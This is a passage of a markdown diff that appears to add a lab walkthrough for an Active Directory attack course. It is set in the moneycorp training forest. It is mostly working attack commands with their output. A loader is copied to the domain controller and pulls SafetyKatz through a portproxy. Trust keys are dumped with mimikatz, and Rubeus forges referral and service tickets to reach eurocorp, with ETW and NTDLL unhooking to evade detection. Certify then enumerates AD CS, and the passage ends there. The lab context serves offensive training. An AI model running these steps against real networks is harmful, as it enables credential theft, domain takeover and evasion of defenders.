+  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
+  StartTime                :  9/29/2025 5:05:23 PM
+  EndTime                  :  9/30/2025 3:05:23 AM
+  RenewTill                :  10/6/2025 5:05:23 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  qBCtncEMUwIGiPsyYHzrohnZBq/WbvApuDfC0ogbuzI=
+  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
+```
+
+Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to 
+extract credentials
+
+* C:\Windows\system32> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+* C:\Windows\system32>winrs -r:dcorp-dc cmd
+* C:\Users\svcadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.31
+* C:\Users\svcadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
+
+```
+mimikatz(commandline) # lsadump::evasive-trust /patch
+
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)
+
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 9/29/2025 6:16:22 AM - CLEAR   - 3d 7b 6d 8e c0 ac dd 93 41 d7 b7 08 52 9b b5 9e fe 9d eb 22 c0 dc 1c 00 a4 29 cf a0
+        * aes256_hmac       f5df9e0114b22c7d407390ded7518f099df459b0f5cfa6442a002ff6ada20b08
+        * aes128_hmac       5ae1bd2a9ff73bc182f346c29f510cb0
+        * rc4_hmac_nt       71aec776d7fcdf15e2c88ad385d3ae56
+
+ [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:16:22 AM - CLEAR   - 3d 7b 6d 8e c0 ac dd 93 41 d7 b7 08 52 9b b5 9e fe 9d eb 22 c0 dc 1c 00 a4 29 cf a0
+        * aes256_hmac       971bea1bd496d8a861e5e8eb9c01ad02f86f07c8b1dce9a33bce97d5304121fc
+        * aes128_hmac       4b1134b67f242aa25b232be34c477156
+        * rc4_hmac_nt       71aec776d7fcdf15e2c88ad385d3ae56
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 9/29/2025 6:01:42 AM - CLEAR   - b4 7c 78 65 11 dd 1a 2c 73 37 09 e7 99 74 df 0c 5f 36 51 ae da cc 31 d6 26 f2 eb cb
+        * aes256_hmac       a1c88f2007e13ffd0738c872a8da2cf1a2f5c646ecf7250cf411efa2f4c8089c
+        * aes128_hmac       77435bfd4e0f70dbf8b413d997e82831
+        * rc4_hmac_nt       0de9fd50b5efab081a6dffdbdad81365
+
+ [Out-1] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:01:42 AM - CLEAR   - b4 7c 78 65 11 dd 1a 2c 73 37 09 e7 99 74 df 0c 5f 36 51 ae da cc 31 d6 26 f2 eb cb
+        * aes256_hmac       ffd707848548078e1bbfa9499482b1c52cbf1addd67e80c3ddd3bed09d86af49
+        * aes128_hmac       1f54cd8cef36b8ab6b0f651e69640c4b
+        * rc4_hmac_nt       0de9fd50b5efab081a6dffdbdad81365
+
+
+Domain: US.DOLLARCORP.MONEYCORP.LOCAL (US / S-1-5-21-1028785420-4100948154-1806204659)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:16:28 AM - CLEAR   - 1c b8 bb 7c 3b 60 61 c0 18 ed 98 4e dc 5b 1d 95 d7 1a 70 bd 89 e0 6b 1f fd e5 46 aa
+        * aes256_hmac       756e2b78302cfcb400ab4828451fd6c5034641dd5624879a4b79af2e75053bd6
+        * aes128_hmac       fd860fd4fb33a628edb3f1abbf8641cc
+        * rc4_hmac_nt       756d91067ba3e63145b0a23cb8af1b2b
+
+ [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:16:28 AM - CLEAR   - 1c b8 bb 7c 3b 60 61 c0 18 ed 98 4e dc 5b 1d 95 d7 1a 70 bd 89 e0 6b 1f fd e5 46 aa
+        * aes256_hmac       18b32ba1c1d4b5ed7d2f32bb6a82483032611c5c5d2635b4c6e3fa803f5f9480
+        * aes128_hmac       84c8618a04082c830b4ba775f75ad66a
+        * rc4_hmac_nt       756d91067ba3e63145b0a23cb8af1b2b
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:01:56 AM - CLEAR   - 2f fa 6d dc e0 04 e4 b9 eb 0c 5a 66 7b db 0a 4a fb 76 31 61 d8 8d b2 2d 7a 45 06 1b
+        * aes256_hmac       c92c7306d29c455980c40ef2166f81e428c1ba5399f56faa86d1e3a6c916b80f
+        * aes128_hmac       7a2ff334f3e3347b4d41e84acbdf7855
+        * rc4_hmac_nt       44bbb47568e83b4fd4e8dbd3d547c427
+
+ [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:01:56 AM - CLEAR   - 2f fa 6d dc e0 04 e4 b9 eb 0c 5a 66 7b db 0a 4a fb 76 31 61 d8 8d b2 2d 7a 45 06 1b
+        * aes256_hmac       918d8d3ba3c5f32137108b68701476236d55826a06c2fa957b8fe25d118279ec
+        * aes128_hmac       d20b6dbe66437dc4b7d9d1adfd6958f5
+        * rc4_hmac_nt       44bbb47568e83b4fd4e8dbd3d547c427
+
+
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 9/29/2025 6:16:26 AM - CLEAR   - 53 8d 46 98 c8 18 29 2a 3e 8e 98 a9 ae 58 6f 48 ae 3e 69 1b 71 45 75 33 ee fe a9 a1
+        * aes256_hmac       7ca2124ec30f6e3428d216b010b1000565c7da3394514e45e4cf07db2a03282b
+        * aes128_hmac       021aa8b46cd27277f611face6f4faef8
+        * rc4_hmac_nt       d390a1c5ea42d2cfce4058c1a128fbba
+
+ [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:16:26 AM - CLEAR   - 53 8d 46 98 c8 18 29 2a 3e 8e 98 a9 ae 58 6f 48 ae 3e 69 1b 71 45 75 33 ee fe a9 a1
+        * aes256_hmac       ba7cc062e3388afc9b39c56a9e35fb77b899abb7dd7ceb9aed9d758f3f7c490f
+        * aes128_hmac       39d348732d144bec494bdec80b792db7
+        * rc4_hmac_nt       d390a1c5ea42d2cfce4058c1a128fbba
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 9/29/2025 6:01:52 AM - CLEAR   - 1e bb db 29 af 1d 95 9c 78 4c dc 2c 5b 24 e9 56 e4 ae 04 dc 5a 99 cb 45 77 aa 34 c5
+        * aes256_hmac       10a0b7415471a1a1eb373a6076d0d916c155afee964d30e218871186c57b2c6c
+        * aes128_hmac       786bd9d0c950fb1c3c56626ab7b2ffb4
+        * rc4_hmac_nt       603518e54242753e9b77f4e7d702ff6c
+
+ [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 9/29/2025 6:01:52 AM - CLEAR   - 1e bb db 29 af 1d 95 9c 78 4c dc 2c 5b 24 e9 56 e4 ae 04 dc 5a 99 cb 45 77 aa 34 c5
+        * aes256_hmac       f56429861d982209946d43adfa40405310c456010f64cccccb02b9e636245f51
+        * aes128_hmac       5004628e8ae8d7e6e1503e6017f70bf8
+        * rc4_hmac_nt       603518e54242753e9b77f4e7d702ff6c
+
+mimikatz(commandline) # exit
+Bye!
+```
+
+### Forge a referral ticket
+Let’s Forge a referral ticket. 
+
+Note that we are not injecting any SID History here as it would be filtered out.
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:d390a1c5ea42d2cfce4058c1a128fbba /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
+
+```
+[+] Successfully unhooked ETW!
+[+++] NTDLL.DLL IS UNHOOKED!
+[+++] KERNEL32.DLL IS UNHOOKED!
+[+++] KERNELBASE.DLL IS UNHOOKED!
+[+++] ADVAPI32.DLL IS UNHOOKED!
+[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:d390a1c5ea42d2cfce4058c1a128fbba /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
+[*] Action: Build TGS
+
+[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
+[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
+[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully mounted
+[*] Attempting to unmount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
+[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
+[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
+[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully mounted
+[*] Attempting to unmount: \\us.dollarcorp.moneycorp.local\SYSVOL
+[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
+[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
+[*] Retrieving group information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513))'
+[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
+[*] Building PAC
+
+[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
+[*] SID            : S-1-5-21-719815819-3726368948-3917688648
+[*] UserId         : 500
+[*] Groups         : 544,512,520,513
+[*] ServiceKey     : D390A1C5EA42D2CFCE4058C1A128FBBA
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+[*] KDCKey         : D390A1C5EA42D2CFCE4058C1A128FBBA
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
+[*] Service        : krbtgt
+[*] Target         : DOLLARCORP.MONEYCORP.LOCAL
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'
+
+[*] AuthTime       : 9/29/2025 5:15:47 PM
+[*] StartTime      : 9/29/2025 5:15:47 PM
+[*] EndTime        : 9/30/2025 3:15:47 AM
+[*] RenewTill      : 10/6/2025 5:15:47 PM
+
+[*] base64(ticket.kirbi):
+
+      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
+```
+
+Copy the base64 encoded ticket from above and use it in the following command
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGFjCCBhKgAwIBBaEDAgEWooIE4jCCBN5hggTaM...
+
+```
+[+] Successfully unhooked ETW!
+[+++] NTDLL.DLL IS UNHOOKED!
+[+++] KERNEL32.DLL IS UNHOOKED!
+[+++] KERNELBASE.DLL IS UNHOOKED!
+[+++] ADVAPI32.DLL IS UNHOOKED!
+[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket: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
+[*] Action: Ask TGS
+
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building TGS-REQ request for: 'cifs/eurocorp-dc.eurocorp.LOCAL'
+[*] Using domain controller: eurocorp-dc.eurocorp.LOCAL (172.16.15.1)
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      doIF5jCCBeKgAwIBBaEDAgEWooIEyDCCBMRhggTAMIIEvKADAgEFoRAbDkVVUk9DT1JQLkxPQ0FMoi0w
+      K6ADAgECoSQwIhsEY2lmcxsaZXVyb2NvcnAtZGMuZXVyb2NvcnAuTE9DQUyjggRyMIIEbqADAgESoQMC
+      AQ6iggRgBIIEXLLc5OGC2NLSHGtq3jrrZ6N13YNqoB6sQJbaC7TSWPMZgdaF4LiMnU5m6bZ7hhgi2N06
+      e6bbFmEE3mhwvWrtkfJQE9xPMKnZliNocfFLnAJXZuJ4My7uTvaCkG3xApaPX82bXDnSaNpFSKiW41vw
+      iJBQN4pkMxyzrjuXaX3ypcwKykhumrTLnUzW94WaraRCrxVytxMj+dazS6CLDFu9J3EegfCQQX7W3/fO
+      eyM/EM/WiSUNAYFczScYevNwczdMq3SrBIhUWZzqeR6HQxk7kXvArqxcAff24FT6uLUvyjK/9alGKfzt
+      NeIf59H0rAInBkgVe6/HVem/BMg+L7Qar/uIgLJUwQ6C2c44StumvsgCp6QQmlafPkL36LdHkKrFVRwI
+      CR2HQpscX5kEaACHzd73zK7UU09zFaLq0hws9nRq4N1U/3Y22uUBM6pIOCwEIa4qhYG8VxFuWqkpLzYM
+      HKlZl/IMrYiGQ0cVe5P93FttsdYKAQ7hb61v6ULPnECu8dZ51KILEBthaNkpmBTTjJgWhn36R2K5fS99
+      S3GfnJkrVohCDKRsXs2OUKCyQs7A/RDfpZWFPK1Uhm1Q1KaYV9eI+5An0+kHFTSsHP+H/hGvD9vHWBA/
+      p6llEpwTqyXhGN9kjpq+v1VQcDwaDSiIWLaa1f2nYcRRhU0CTjl46/r2cPUcc8OjLUGJJI7cUwvUQGaX
+      09tndjVSuQ1nCSwfrpy7xs+9+97KKW5HaToQRkeoqJX5GP34jxfQOLgv7jdJqN0izkfQ/sDENJNKjWb9
+      2hPbF1OOqPoRruWwJTaKrC9Zw7ZLKpmGotnt+A20FRCgkwsrCsAiCcwqz/GTeELKQmYqGrES9Y19e+tB
+      nIGaO6NCncWQuPUVeHhyc0K+wROVYsZ940veuUOhz0HYJxL6M0x3BtCRLUfSFSQn+0u7SJMUmsu3emn8
+      lY5BeNnot/Z/Vgady9B2ZdW3cpkivuB2/ypvxUN40pJ+IMPx/OUCiS/zocIn9Af6ectZCklW2Cs/tmL0
+      Ml7Cyb9ZOktAcvRUWBBmf6rQc/CZyTHw0kxaSz1xStFCTvJsmNidii/MtB5SlZfCX0k6sMGh2+30DEPK
+      EG1mZIr7ZRFacjnQmaMUdgIxPAoNoQJmzcezGRs68cohBJTWh5waBUM6vqOFUI7mjqdZe0FB4k4rcmCp
+      iahwxm3FwynKRDxK+AeOHMDBoKqaX0Xkm8ncmaR4iH7a0itS98JvMwl7/tI6pMMH1S5i22NMuxlV3GMP
+      WfMTBMz2wqH2o9rg2QPxjrd8GEdTbxBPEjI0pzKG29FoyEkgAvWGsNR5+gtxqR+xWuv/t46taeROVllA
+      HMe1iFdvpGC0E3IfVKz90XnDqF2wuiZVI/921lM/sme/ILKaXuVLGp7+BY1K73mo8LKjPSAxCJoz4Lf3
+      3Fe9g09wC8W6WhW7vTWg4ynmVHPmBbah8vUAR36tMA+z5pbAxg0NGvZZIEM4q6OCAQgwggEEoAMCAQCi
+      gfwEgfl9gfYwgfOggfAwge0wgeqgKzApoAMCARKhIgQg8Cb+3rMzPu2ZDa+49VDLKQRYOXuqW/07jd8U
+      o/MMOSChHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJh
+      dG9yowcDBQBApQAApREYDzIwMjUwOTMwMDAxNjQzWqYRGA8yMDI1MDkzMDEwMTU0N1qnERgPMjAyNTEw
+      MDcwMDE1NDdaqBAbDkVVUk9DT1JQLkxPQ0FMqS0wK6ADAgECoSQwIhsEY2lmcxsaZXVyb2NvcnAtZGMu
+      ZXVyb2NvcnAuTE9DQUw=
+
+  ServiceName              :  cifs/eurocorp-dc.eurocorp.LOCAL
+  ServiceRealm             :  EUROCORP.LOCAL
+  UserName                 :  Administrator (NT_PRINCIPAL)
+  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
+  StartTime                :  9/29/2025 5:16:43 PM
+  EndTime                  :  9/30/2025 3:15:47 AM
+  RenewTill                :  10/6/2025 5:15:47 PM
+  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  8Cb+3rMzPu2ZDa+49VDLKQRYOXuqW/07jd8Uo/MMOSA=
+```
+
+Once the ticket is injected, we can access explicitly shared resources on eurocorp-dc
+
+* C:\Windows\system32> dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+```
+Volume in drive \\eurocorp-dc.eurocorp.local\SharedwithDCorp has no label.
+ Volume Serial Number is 1A5A-FDE2
+
+ Directory of \\eurocorp-dc.eurocorp.local\SharedwithDCorp
+
+11/16/2022  05:26 AM    <DIR>          .
+11/15/2022  07:17 AM                29 secret.txt
+               1 File(s)             29 bytes
+               1 Dir(s)   7,451,525,120 bytes free
+```
+
+* C:\Windows\system32> type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
+```
+Dollarcorp DAs can read this!
+```
+
+Note that the only way to enumerate accessible resources (service on a machine) in eurocorp would be 
+to request a TGS for each one and then attempt to access it.
+
+## Learning Objective 21:
+```
+• Check if AD CS is used by the target forest and find any vulnerable/abusable templates. 
+• Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.
+```
+We can use the Certify tool to check for AD CS in moneycorp:
+
+* C:\AD\Tools> C:\AD\Tools\Certify.exe cas
+```
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate authorities
+[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
+
+
+[*] Root CAs
+
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+
+
+
+[*] NTAuthCertificates - Certificates that enable authentication:
+
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+
+
+[*] Enterprise/Enrollment CAs:
+
+    Enterprise CA Name            : moneycorp-MCORP-DC-CA
+    DNS Hostname                  : mcorp-dc.moneycorp.local
+    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
